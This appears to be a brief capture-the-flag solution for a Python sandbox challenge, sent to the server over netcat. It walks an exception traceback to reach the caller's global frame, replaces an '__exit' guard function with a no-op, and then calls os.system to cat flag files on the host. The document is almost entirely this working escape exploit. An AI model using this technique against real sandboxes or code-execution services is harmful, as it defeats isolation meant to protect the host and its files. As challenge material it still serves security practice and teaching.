# nc ip port < solution.py

def do_nothing(_):
    pass

try:
    raise Exception()
except Exception as ex:
    traceback = ex.__traceback__
    global_frame = traceback.tb_frame.f_back
    global_frame.f_globals["__exit"] = do_nothing

import os
os.system("cat /flag*")
